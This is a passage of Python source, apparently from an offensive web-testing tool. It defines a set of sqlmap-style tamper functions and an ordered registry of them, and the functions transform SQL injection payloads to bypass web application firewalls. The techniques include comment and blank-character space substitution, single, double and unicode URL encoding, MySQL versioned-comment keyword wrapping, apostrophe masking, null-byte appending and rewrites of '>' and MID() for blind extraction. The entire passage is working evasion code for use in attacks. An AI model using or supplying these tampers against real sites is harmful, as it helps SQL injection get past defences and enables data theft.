# ---------------------------------------------------------------------------
# Native WAF-bypass tamper scripts (sqlmap-equivalent). Each takes a payload
# string and returns the transformed payload. Users pick any combination; they
# are applied in the chosen order. Also fed to sqlmap's --tamper= when present.
# ---------------------------------------------------------------------------
_SQL_KW_RE = (r'(?i)\b(UNION|SELECT|FROM|WHERE|INSERT|UPDATE|DELETE|ORDER|GROUP|'
              r'BY|HAVING|LIMIT|AND|OR|CONCAT|GROUP_CONCAT|SLEEP|BENCHMARK|'
              r'INFORMATION_SCHEMA|TABLE_NAME|COLUMN_NAME|DATABASE|VERSION)\b')

def _t_space2comment(p):  return p.replace(" ", "/**/")
def _t_space2plus(p):     return p.replace(" ", "+")
def _t_space2hash(p):     return p.replace(" ", "%23%0A")
def _t_space2dash(p):     return p.replace(" ", "--%0A")
def _t_space2randomblank(p):
    _bl = ["%09", "%0A", "%0C", "%0D"]; _o = []; _i = 0
    for _c in p:
        if _c == " ":
            _o.append(_bl[_i % len(_bl)]); _i += 1
        else:
            _o.append(_c)
    return "".join(_o)
def _t_multiplespaces(p): return p.replace(" ", "    ")
def _t_charencode(p):     return "".join("%{:02x}".format(ord(_c)) for _c in p)
def _t_chardoubleencode(p): return "".join("%25{:02x}".format(ord(_c)) for _c in p)
def _t_charunicodeencode(p): return "".join("%u{:04x}".format(ord(_c)) for _c in p)
def _t_randomcase(p):
    _o = []; _i = 0
    for _c in p:
        if _c.isalpha():
            _o.append(_c.upper() if _i % 2 == 0 else _c.lower()); _i += 1
        else:
            _o.append(_c)
    return "".join(_o)
def _t_uppercase(p):      return p.upper()
def _t_lowercase(p):      return p.lower()
def _t_equaltolike(p):    return re.sub(r'\s*=\s*', ' LIKE ', p)
def _t_apostrophemask(p): return p.replace("'", "%ef%bc%87")
def _t_apostrophenullencode(p): return p.replace("'", "%00%27")
def _t_appendnullbyte(p): return p + "%00"
def _t_base64encode(p):
    try:
        return base64.b64encode(p.encode("utf-8") if isinstance(p, unicode) else p)
    except Exception:
        return base64.b64encode(p)
def _t_unmagicquotes(p):  return p.replace("'", "%bf%27")
def _t_symboliclogical(p):
    p = re.sub(r'(?i)\bAND\b', '%26%26', p)
    return re.sub(r'(?i)\bOR\b', '%7C%7C', p)
def _t_unionalltounion(p): return re.sub(r'(?i)UNION\s+ALL\s+SELECT', 'UNION SELECT', p)
def _t_versionedkeywords(p):
    return re.sub(_SQL_KW_RE, lambda m: "/*!{}*/".format(m.group(0)), p)
def _t_modsecurityversioned(p): return " /*!00000" + p + "*/"
def _t_percentage(p):     return "".join("%" + _c for _c in p)
def _t_halfversionedmorekeywords(p):
    return re.sub(_SQL_KW_RE, lambda m: "/*!0{}".format(m.group(0)), p)
def _t_between(p):
    # '>' -> ' NOT BETWEEN 0 AND '  (defeats WAFs filtering '>' in blind extraction).
    # Only '>' is rewritten -- touching '=' would mangle boundary/quote payloads.
    return re.sub(r'\s*>\s*', ' NOT BETWEEN 0 AND ', p)
def _t_commalessmid(p):
    # MID(A,B,C) -> MID(A FROM B FOR C)  (comma-less, for WAFs blocking commas in MID/SUBSTRING)
    return re.sub(r'(?i)(MID|SUBSTRING)\(([^,()]+),([^,()]+),([^,()]+)\)',
                  lambda m: "{}({} FROM {} FOR {})".format(m.group(1), m.group(2), m.group(3), m.group(4)), p)
def _t_concat2concatws(p):
    # CONCAT(A,B) -> CONCAT_WS(CHAR(0),A,B)  (MySQL WAFs that block CONCAT specifically)
    return re.sub(r'(?i)\bCONCAT\(', 'CONCAT_WS(CHAR(0),', p)
def _t_space2morehash(p):  return p.replace(" ", "%23%0A")  # # + newline (MySQL)

# Ordered so the most common ones appear first in the chooser.
_SQLI_TAMPERS = OrderedDict([
    ("space2comment",            _t_space2comment),
    ("space2plus",               _t_space2plus),
    ("space2hash",               _t_space2hash),
    ("space2dash",               _t_space2dash),
    ("space2randomblank",        _t_space2randomblank),
    ("multiplespaces",           _t_multiplespaces),
    ("charencode",               _t_charencode),
    ("chardoubleencode",         _t_chardoubleencode),
    ("charunicodeencode",        _t_charunicodeencode),
    ("randomcase",               _t_randomcase),
    ("uppercase",                _t_uppercase),
    ("lowercase",                _t_lowercase),
    ("equaltolike",              _t_equaltolike),
    ("apostrophemask",           _t_apostrophemask),
    ("apostrophenullencode",     _t_apostrophenullencode),
    ("appendnullbyte",           _t_appendnullbyte),
    ("base64encode",             _t_base64encode),
    ("unmagicquotes",            _t_unmagicquotes),
    ("symboliclogical",          _t_symboliclogical),
    ("unionalltounion",          _t_unionalltounion),
    ("versionedkeywords",        _t_versionedkeywords),
    ("modsecurityversioned",     _t_modsecurityversioned),
    ("halfversionedmorekeywords", _t_halfversionedmorekeywords),
    ("percentage",               _t_percentage),
    ("between",                  _t_between),
    ("commalessmid",            _t_commalessmid),
    ("concat2concatws",         _t_concat2concatws),
    ("space2morehash",          _t_space2morehash),
])

